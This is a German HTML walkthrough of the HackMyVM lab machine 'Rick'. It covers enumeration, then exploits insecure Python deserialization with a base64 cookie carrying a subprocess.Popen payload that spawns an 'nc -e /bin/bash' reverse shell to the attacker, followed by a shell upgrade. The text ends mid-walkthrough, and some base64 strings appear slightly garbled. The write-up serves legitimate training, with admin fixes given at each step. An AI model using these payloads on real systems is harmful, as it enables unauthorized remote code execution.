@@ -1,0 +1,865 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rick - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad ggf. anpassen -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../index.html">HackMyVM</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnyx.html">Vulnyx</a> <!-- Pfad ggf. anpassen -->
+            <a href="../../vulnhub.html">Vulnhub</a> <!-- Pfad ggf. anpassen -->
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Rick - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- Klasse für Hard gesetzt -->
+            <h2 class="level-hard">Hard</h2>
+            <div class="circle">
+                <!-- Farben werden durch CSS für .level-hard gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Liste der verwendeten Tools basierend auf dem Text -->
+                <div class="tool-item">netdiscover</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ssh-keygen</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">export</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">fg</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">sh</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cd (rbash eingeschränkt)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">perlbug</div>
+                <div class="tool-item">vim (innerhalb perlbug)</div>
+                <div class="tool-item">runc</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">pwd</div>
+             </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                 <!-- Inhaltsverzeichnis angepasst -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a>
+                    <ul>
+                        <li><a href="#web-enum-p80">Port 80 (Apache)</a></li>
+                        <li><a href="#web-enum-p5000">Port 5000 (Werkzeug/Python)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#initial-access">Initial Access (POC - Python Deserialization)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a>
+                    <ul>
+                        <li><a href="#privesc-www-data">Enumeration als www-data</a></li>
+                        <li><a href="#privesc-morty-pass">Passwort-Bruteforce für morty</a></li>
+                        <li><a href="#privesc-morty-shell">Shell als morty (via su & SSH)</a></li>
+                        <li><a href="#privesc-rick-perlbug">POC: Eskalation zu rick (via perlbug)</a></li>
+                        <li><a href="#privesc-rick-userflag">User Flag als rick</a></li>
+                        <li><a href="#privesc-root-runc">POC: Eskalation zu root (via runc)</a></li>
+                    </ul>
+                </li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">netdiscover -r 192.168.2.0/24 -P</span></div>
+                    <pre>
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ <span class="command">192.168.2.152   08:00:27:ef:97:84      1      60  PCS Systemtechnik GmbH</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Das Tool `netdiscover` wird verwendet, um aktive Hosts im lokalen Netzwerksegment `192.168.2.0/24` zu finden. Die Option `-r` gibt den Bereich an, `-P` gibt die Ergebnisse aus und beendet das Tool. Es findet einen Host mit der IP `192.168.2.152`. Die MAC-Adresse `08:00:27:ef:97:84` deutet (wie im vorherigen Bericht) auf eine VirtualBox-VM hin.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Zielsystem wurde erfolgreich identifiziert. Die IP `192.168.2.152` wird für die weiteren Schritte benötigt.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Die gefundene IP `192.168.2.152` für den Nmap-Scan verwenden.<br>
+                **Empfehlung (Admin):** Netzwerk-Inventarisierung und -Überwachung, um sicherzustellen, dass nur bekannte und autorisierte Geräte im Netzwerk aktiv sind.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.152 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-17 13:18 CEST
+Nmap scan report for rick.vm (<span class="command">192.168.2.152</span>)
+Host is up (0.00016s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f (RSA)
+|   256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 (ECDSA)
+|_  256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a (ED25519)
+<span class="command">80/tcp   open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_http-title: Apache2 Test Debian Default Page: It works
+|_http-server-header: Apache/2.4.38 (Debian)
+<span class="command">5000/tcp open  http    Werkzeug httpd 0.15.5 (Python 2.7.16)</span>
+| http-title: 500 Internal Server Error
+|_Requested resource was http://rick.vm:5000/whoami
+MAC Address: <span class="command">08:00:27:EF:97:84</span> (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: <span class="command">Linux 4.15 - 5.6</span>
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms rick.vm (<span class="command">192.168.2.152</span>)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                **Analyse:** Ein detaillierter Nmap-Scan (`-sS -sC -sV -A -p-`) auf `192.168.2.152` (Host wird als `rick.vm` identifiziert) zeigt drei offene TCP-Ports:
+                *   **Port 22:** SSH (OpenSSH 7.9p1 auf Debian 10). Standard-Login-Dienst.
+                *   **Port 80:** HTTP (Apache 2.4.38 auf Debian). Zeigt die Apache-Standardseite ("It works").
+                *   **Port 5000:** HTTP (Werkzeug httpd 0.15.5, basierend auf Python 2.7.16). Gibt einen "500 Internal Server Error" zurück, aber der Titel deutet darauf hin, dass die Ressource `/whoami` angefragt wurde. Werkzeug ist ein WSGI-Utility-Framework für Python, oft mit Flask oder ähnlichen Web-Frameworks verwendet.
+                Der Scan bestätigt das Betriebssystem als Linux/Debian.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Ports 80 und 5000 sind die Hauptangriffsvektoren.
+                *   **Port 80:** Wahrscheinlich wenig interessant, da es die Standardseite ist, aber Enumeration (gobuster) ist trotzdem sinnvoll.
+                *   **Port 5000:** Sehr interessant. Ein Python/Werkzeug-basierter Webserver, der einen internen Fehler zurückgibt, ist oft ein Zeichen für eine laufende, aber möglicherweise fehlerhafte oder unfertige Webanwendung. Die Kombination aus Python 2.7 (veraltet) und Werkzeug könnte auf Schwachstellen hindeuten, insbesondere im Bereich der Datenverarbeitung (z.B. Deserialisierung), wenn Benutzereingaben verarbeitet werden. Der Fehler beim Aufruf von `/whoami` ist ein starker Hinweis.
+                *   **Port 22:** Standard-SSH, erfordert Anmeldeinformationen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):**
+                1.  **Hosts-Datei:** Den Hostnamen `rick.vm` zur lokalen `/etc/hosts`-Datei hinzufügen (auf `192.168.2.152` zeigend).
+                2.  **Port 80:** Mit `gobuster` nach versteckten Inhalten suchen.
+                3.  **Port 5000:** Den Dienst genauer untersuchen:
+                    *   Mit `curl -v` die vollständigen Header und die Fehlerseite analysieren. Auf Cookies oder andere interessante Header achten.
+                    *   Versuchen, die Ressource `/whoami` direkt anzufordern.
+                    *   Nach bekannten Schwachstellen in Werkzeug 0.15.5 oder spezifischen Python 2.7 Web-Framework-Schwachstellen suchen (insbesondere unsichere Deserialisierung).
+                4.  **SSH:** Vorerst zurückstellen.<br>
+                **Empfehlung (Admin):**
+                1.  **Port 80:** Wenn nur die Standardseite angezeigt wird, den Apache-Dienst deaktivieren oder entsprechend konfigurieren.
+                2.  **Port 5000:**
+                    *   Anwendung auf Python 3 migrieren (Python 2.7 ist End-of-Life).
+                    *   Abhängigkeiten (Werkzeug) aktualisieren.
+                    *   Die Ursache des "500 Internal Server Error" beheben. Fehlerseiten sollten keine detaillierten Debug-Informationen preisgeben.
+                    *   Sicherstellen, dass keine unsicheren Praktiken wie die Deserialisierung von nicht vertrauenswürdigen Daten verwendet werden. Zugriff auf den Dienst über Firewall einschränken.
+                3.  **SSH:** Standard-Härtung.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <h3 id="web-enum-p80">Port 80 (Apache)</h3>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.152/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,.bck,mp4,mkv -t 100 -e -s "200,204,301,302,307,401" | grep -v "Size: 0"</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.152/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              [...]
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/17 13:24:30 Starting gobuster in directory enumeration mode
+===============================================================
+/<span class="command">index.html</span>           (Status: 200) [Size: 10706]
+/<span class="command">manual</span>               (Status: 301) [Size: 315] [--> http://192.168.2.152/manual/]
+/<span class="command">javascript</span>           (Status: 301) [Size: 319] [--> http://192.168.2.152/javascript/]
+/<span class="command">robots.txt</span>           (Status: 403) [Size: 278]
+
+===============================================================
+2022/10/17 13:26:15 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** `gobuster` wird auf Port 80 ausgeführt, um Verzeichnisse und Dateien zu finden. Es werden positive Statuscodes (`-s "200,..."`) angezeigt und Ergebnisse mit Größe 0 ignoriert (`grep -v "Size: 0"`).
+                *   `/index.html`: Die Apache-Standardseite (Status 200).
+                *   `/manual`: Leitet auf `/manual/` um (Status 301). Dies ist wahrscheinlich das Apache-Handbuch.
+                *   `/javascript`: Leitet auf `/javascript/` um (Status 301). Unklarer Inhalt, könnte ebenfalls Standard sein.
+                *   `/robots.txt`: Zugriff verboten (Status 403).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Keine ungewöhnlichen oder direkt ausnutzbaren Verzeichnisse gefunden. Das Apache-Manual könnte Informationen über Module oder Konfigurationen enthalten, ist aber selten direkt verwundbar. Der verbotene Zugriff auf `robots.txt` ist ungewöhnlich, normalerweise ist diese Datei öffentlich.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** `/manual/` und `/javascript/` mit `gobuster` oder manuell weiter untersuchen, falls noch nicht geschehen. Versuchen, `/robots.txt` mit anderen Methoden abzurufen (z.B. anderer User-Agent), obwohl ein 403 meist endgültig ist. Da hier nichts Wesentliches gefunden wurde, Fokus auf Port 5000 legen.<br>
+                **Empfehlung (Admin):** Das Apache-Handbuch (`/manual`) sollte auf Produktivsystemen deaktiviert werden. Den Grund für den 403-Fehler bei `robots.txt` prüfen; normalerweise sollte diese Datei lesbar sein (Status 200) oder nicht existieren (Status 404). Falsche Berechtigungen könnten die Ursache sein.
+            </p>
+
+            <h3 id="web-enum-p5000">Port 5000 (Werkzeug/Python)</h3>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">ssh 192.168.2.152</span></div>
+                     <pre>
+<span class="password">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
+Someone could be eavesdropping on you right now (man-in-the-middle attack)!
+It is also possible that a host key has just been changed.
+The fingerprint for the ED25519 key sent by the remote host is
+SHA256:ntMXt1jIeiDKNEuRMRXU6uCVo/fmwaEqmxDA5r4nwds.
+Please contact your system administrator.
+Add correct host key in /root/.ssh/known_hosts to get rid of this message.
+Offending ED25519 key in /root/.ssh/known_hosts:141
+  remove with:
+  ssh-keygen -f "/root/.ssh/known_hosts" -R "192.168.2.152"
+Host key for 192.168.2.152 has changed and you have requested strict checking.
+Host key verification failed.</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der Versuch, sich per SSH mit `192.168.2.152` zu verbinden, schlägt fehl mit einer "REMOTE HOST IDENTIFICATION HAS CHANGED!" Warnung. Der SSH-Client hat einen anderen Host-Key für diese IP-Adresse in seiner `/root/.ssh/known_hosts`-Datei gespeichert als den, den der Server jetzt präsentiert (Fingerprint `SHA256:ntMXt1jIeiDKNEuRMRXU6uCVo/fmwaEqmxDA5r4nwds`).
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Dies passiert oft in Testumgebungen, wenn VMs neu aufgesetzt oder geklont werden und dabei neue SSH-Host-Keys generieren. Der Client verweigert die Verbindung aus Sicherheitsgründen (Schutz vor Man-in-the-Middle-Angriffen). Für den Pentest ist dies meist unbedenklich, der alte Eintrag muss entfernt werden.
+             </p>
+             <p class="recommendation">
+                 **Empfehlung (Pentester):** Den alten Host-Key-Eintrag wie vorgeschlagen entfernen: `ssh-keygen -f "/root/.ssh/known_hosts" -R "192.168.2.152"`. Danach den SSH-Verbindungsversuch wiederholen und den neuen Schlüssel akzeptieren.<br>
+                 **Empfehlung (Admin):** In einer produktiven Umgebung wäre diese Warnung ein ernstes Alarmsignal, das auf einen möglichen Angriff oder eine Serverkompromittierung hindeuten könnte und sofort untersucht werden müsste.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -v http://192.168.2.152:5000</span></div>
+                     <pre>
+*   Trying 192.168.2.152:5000...
+* Connected to 192.168.2.152 (192.168.2.152) port 5000 (#0)
+> GET / HTTP/1.1
+> Host: 192.168.2.152:5000
+> User-Agent: curl/7.84.0
+> Accept: */*
+>
+* Mark bundle as not supporting multiuse
+* HTTP 1.0, assume close after body
+< HTTP/1.0 <span class="command">302 FOUND</span>
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 221
+< <span class="command">Location: http://192.168.2.152:5000/whoami</span>
+< <span class="command">Set-Cookie: username=eyJweS9vYmplY3QiiAiX19tYWluX18uVXNlciIsICJ1c2VybmFtZSI6ICJSaWNrIn0=; Path=/</span>
+< Server: Werkzeug/0.15.5 Python/2.7.16
+< Date: Mon, 17 Oct 2022 11:25:22 GMT
+<
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+* Closing connection 0
+<p>You should be redirected automatically to target URL: <span class="command"><a href="/whoami">/whoami</a></span>.  If not click the link.
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 **Analyse:** Ein `curl -v`-Aufruf auf `http://192.168.2.152:5000` zeigt das Verhalten des Python-Webservers:
+                 *   Er antwortet mit einem HTTP-Statuscode `302 Found`, was eine Umleitung bedeutet.
+                 *   Der `Location`-Header gibt das Umleitungsziel an: `/whoami`.
+                 *   Ein `Set-Cookie`-Header setzt ein Cookie namens `username` mit einem Base64-kodierten Wert (`eyJ...In0=`).
+                 *   Der Server identifiziert sich als `Werkzeug/0.15.5 Python/2.7.16`.
+                 *   Der HTML-Body enthält einen Link zum Umleitungsziel `/whoami`.
+             </p>
+             <p class="evaluation">
+                 **Bewertung:** Das ist ein sehr aufschlussreiches Verhalten. Die Anwendung leitet auf `/whoami` um und setzt dabei ein Cookie, das offenbar Benutzerinformationen enthält. Der Base64-Wert im Cookie ist der Schlüssel zum nächsten Schritt.
+             </p>
+              <p class="recommendation">
+                 **Empfehlung (Pentester):**
+                 1.  Den Base64-Wert des `username`-Cookies dekodieren.
+                 2.  Das Umleitungsziel `/whoami` direkt aufrufen (`curl http://192.168.2.152:5000/whoami`), um zu sehen, was dort passiert (wahrscheinlich der "500 Internal Server Error" aus dem Nmap-Scan).
+                 3.  Den dekodierten Cookie-Inhalt analysieren. Wenn er serialisierte Objekte enthält (besonders bei Python/Werkzeug), auf Schwachstellen durch unsichere Deserialisierung prüfen.<br>
+                 **Empfehlung (Admin):** Die Verwendung von Cookies zur Speicherung von Benutzerobjekten ist potenziell gefährlich, wenn die Daten nicht kryptographisch signiert oder verschlüsselt sind und wenn unsichere Deserialisierungsbibliotheken verwendet werden. Sitzungsdaten sollten serverseitig gespeichert oder sicher (signiert/verschlüsselt) im Cookie abgelegt werden. Die Anwendung sollte so umgeschrieben werden, dass sie keine serialisierten Objekte im Cookie speichert.
+             </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (POC - Python Deserialization)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "eyJweS9vYmplY3QiiAiX19tYWluX18uVXNlciIsICJ1c2VybmFtZSI6ICJSaWNrIn0=" | base64 -d</span></div>
+                     <pre>
+<span class="command">{"py/object": "__main__.User", "username": "Rick"}</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Base64-kodierte Wert aus dem `username`-Cookie wird dekodiert. Das Ergebnis ist ein JSON-String: `{"py/object": "__main__.User", "username": "Rick"}`.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das ist ein klarer Fall von serialisierten Python-Objekten im Cookie! Die Struktur `{"py/object": ...}` deutet stark auf die Verwendung einer Bibliothek wie `pyyaml` oder einer benutzerdefinierten Serialisierung hin, die Objekte rekonstruiert. Der Server nimmt diesen Cookie-Wert, deserialisiert ihn wahrscheinlich, um ein `User`-Objekt mit dem Attribut `username` = "Rick" zu erstellen. **Dies ist eine hochkritische Schwachstelle**, bekannt als "Insecure Deserialization". Wenn der Server beliebige serialisierte Daten aus dem Cookie deserialisiert, kann ein Angreifer ein manipuliertes Objekt erstellen, das bei der Deserialisierung Code auf dem Server ausführt (Remote Code Execution - RCE). Python's `pickle`-Modul ist notorisch dafür, aber auch andere Bibliotheken können anfällig sein. Die `py/reduce`-Struktur (siehe nächster Schritt) ist typisch für Payloads, die `subprocess.Popen` zur Codeausführung missbrauchen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Einen Payload erstellen, der bei der Deserialisierung Code ausführt. Ein gängiger Ansatz ist die Verwendung von `subprocess.Popen` innerhalb einer `py/reduce`-Struktur, um einen Befehl wie `nc` für eine Reverse Shell zu starten. Den resultierenden Objekt-String Base64-kodieren und als Wert für das `username`-Cookie in einer neuen Anfrage an den Server senden.<br>
+                **Empfehlung (Admin):** **Dringend beheben!** Niemals unsignierte, vom Client kontrollierte Daten deserialisieren, die Objekte rekonstruieren können. Wenn Cookies für Sitzungsdaten verwendet werden müssen:
+                *   Nur primitive Datentypen speichern.
+                *   Cookies kryptographisch signieren (z.B. mit HMAC), um Manipulationen zu verhindern.
+                *   Sichere Deserialisierungsbibliotheken verwenden oder ganz darauf verzichten.
+                *   Die Anwendung auf eine sicherere Architektur umstellen.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="comment"># Ziel-Payload für RCE (Reverse Shell)</span>
+<span class="command">{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["nc", "-e", "/bin/bash", "192.168.2.153", "5555"]}]}]}</span>
+                    </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo '{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["nc", "-e", "/bin/bash", "192.168.2.153", "5555"]}]}]}' | base64</span></div>
+                    <pre>
+<span class="command">e3B5L3JlZHVjZTogW3tweS90eXBliBzdWJwcm9jZXNzLlBvcGVufSwge3B5L3R1cGxliBbe3B5L3R1cGxliBbbmMsIC1lLCAvYmluL2Jhc2gsIDE5Mi4xNjguMi4xNTMsIDU1NTVdfV19XX0K</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                **Analyse:** Der Pentester konstruiert den bösartigen Payload.
+                *   Die JSON-Struktur `{"py/reduce": ...}` wird verwendet, um die Ausführung von Code während der Deserialisierung zu ermöglichen.
+                *   `{"py/type": "subprocess.Popen"}`: Gibt an, dass die `Popen`-Klasse aus dem `subprocess`-Modul verwendet werden soll.
+                *   `{"py/tuple": [{"py/tuple": ["nc", "-e", "/bin/bash", "192.168.2.153", "5555"]}]}`: Definiert die Argumente, die an den `Popen`-Konstruktor übergeben werden. Dies startet Netcat (`nc`), um eine Reverse Shell (`-e /bin/bash`) zur IP-Adresse des Angreifers (`192.168.2.153`) auf Port `5555` zu senden.
+                *   Dieser JSON-Payload wird dann mit `base64` kodiert, um den Wert zu erhalten, der in das `username`-Cookie eingefügt wird (`e3B...X0K`). *Hinweis: Im Log wird später Port 8888 verwendet, nicht 5555.*
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Der Payload ist korrekt konstruiert, um eine Reverse Shell mittels unsicherer Deserialisierung auszulösen. Der Base64-kodierte String ist bereit, im Cookie verwendet zu werden.
+            </p>
+             <p class="recommendation">
+                **Empfehlung (Pentester):** Einen Netcat-Listener auf der eigenen Maschine (IP `192.168.2.153`) auf dem gewählten Port (im Log später `8888`) starten (`nc -lvnp 8888`). Dann eine Anfrage (z.B. mit `curl`) an `http://192.168.2.152:5000` senden und dabei das `username`-Cookie mit dem generierten Base64-Payload setzen.<br>
+                **Empfehlung (Admin):** Siehe vorherige Empfehlung zur Behebung der Deserialisierungs-Schwachstelle.
+            </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Fehlerhafter erster Versuch mit falschem Base64 (enthält echo/pipe) -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl --cookie "username=ZWNobyAieyJweS9yZWR1Y2UiiBbeyJweS90eXBlIjogInN1YnByb2Nlc3MuUG9wZW4ifSwgeyJweS90dXBsZSI6IFt7InB5L3R1cGxlIjogWyJuYyIsICItZSIsICIvYmluL2Jhc2giLCAiMTkyLjE2C4yLjE1MyIsICI4Dg4Il19XX1dfSIgfCBiYXNlNjQ=" http://192.168.2.152:5000</span></div>
+                     <pre>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis">
+                 **Analyse:** Ein erster `curl`-Versuch wird unternommen. Der Base64-String im Cookie (`ZWN...NjQ=`) dekodiert jedoch zu `echo '{"py/reduce": [...] }' | base64`, was nicht der korrekte Payload ist, sondern den Befehl zur Erzeugung des Payloads enthält. Daher schlägt die Deserialisierung fehl und resultiert in einem "500 Internal Server Error".
+            </p>
+             <p class="evaluation">
+                 **Bewertung:** Fehler beim Kopieren/Einfügen des Base64-Payloads. Der Server reagiert mit einem Fehler, aber die Schwachstelle wurde nicht ausgelöst.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">nc -lvnp 8888</span></div>
+                     <pre>
+<span class="password">listening on [any] 8888 ...</span>
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                 **Analyse:** Der Netcat-Listener wird auf der Angreifer-Maschine auf Port 8888 gestartet, um die eingehende Reverse Shell zu empfangen.
+             </p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Korrigierter curl Versuch -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl --cookie "username=eyJweS9yZWR1Y2UiiBbeyJweS90eXBlIjogInN1YnByb2Nlc3MuUG9wZW4ifSwgeyJweS90dXBsZSI6IFt7InB5L3R1cGxlIjogWyJuYyIsICItZSIsICIvYmluL2Jhc2giLCAiMTkyLjE2OC4yLjE1MyIsICI4ODg4Il19XX1dfQ=="  http://192.168.2.152:5000</span></div>
+                    <pre>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
+                    </pre>
+                 </div>
+             </div>
+              <p class="analysis">
+                **Analyse:** Der `curl`-Befehl wird erneut ausgeführt, diesmal mit dem korrekten Base64-Payload (`eyJ...fQ==`) für das `username`-Cookie (angepasst auf Port 8888). Die Anfrage wird an `http://192.168.2.152:5000` gesendet. Der Server antwortet immer noch mit einem "500 Internal Server Error", aber diesmal ist dies das erwartete Verhalten, da die Ausführung des `nc`-Befehls im Hintergrund gestartet wird und die Webanwendung selbst möglicherweise abstürzt oder keinen gültigen Response mehr generieren kann.
+            </p>
+             <p class="evaluation">
+                **Bewertung:** Obwohl ein Fehler angezeigt wird, sollte im Hintergrund der `nc`-Prozess auf dem Server gestartet worden sein und eine Verbindung zum Listener aufgebaut haben.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Ausgabe im Netcat Listener Fenster -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">nc -lvnp 8888</span></div>
+                     <pre>
+<span class="password">listening on [any] 8888 ...</span>
+<span class="password">connect to [192.168.2.153] from (UNKNOWN) [192.168.2.152] 45348</span> <span class="comment"># Verbindung erfolgreich!</span>
+<span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span> <span class="comment"># Shell Upgrade Befehl 1</span>
+<span class="prompt">www-data@rick:~$</span> export TERM=xterm <span class="comment"># Shell Upgrade Befehl 2</span>
+www-data@rick:~$ <span class="comment"># Shell Upgrade Befehl 3 (Ctrl+Z)</span>
+                     </pre>
+                      <!-- Zurück zur lokalen Shell nach Ctrl+Z -->
+                     <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                      <pre>
+[1]  + continued  nc -lvnp 8888
+                               reset <span class="comment"># Terminal zurückgesetzt</span>
+
+<span class="prompt">www-data@rick:~$</span> <span class="comment"># Voll funktionsfähige Shell</span>
+                     </pre>
+                 </div>
+            </div>
+              <p class="analysis">
+                 **Analyse:** Der Netcat-Listener zeigt die eingehende Verbindung vom Zielsystem (`192.168.2.152`). Der Pentester führt sofort Befehle aus, um die einfache Netcat-Shell in eine voll interaktive TTY (Pseudo-Terminal) aufzuwerten:
+                 1.  `python3 -c 'import pty;pty.spawn("/bin/bash")'`: Startet eine richtige Bash-Shell innerhalb eines PTY. Python 3 muss auf dem Ziel installiert sein.
+                 2.  `export TERM=xterm`: Setzt die Terminal-Typ-Variable, damit Programme wie `vim` oder `clear` korrekt funktionieren.
+                 3.  `Ctrl+Z`: Sendet den Netcat-Prozess auf der lokalen Maschine in den Hintergrund.
+                 4.  `stty raw -echo; fg`: Stellt das lokale Terminal auf "raw" (leitet alle Tastendrücke direkt weiter) und deaktiviert das lokale Echo, dann holt es den Netcat-Prozess (`fg`) wieder in den Vordergrund. `reset` stellt das Terminal nach Beendigung wieder her.
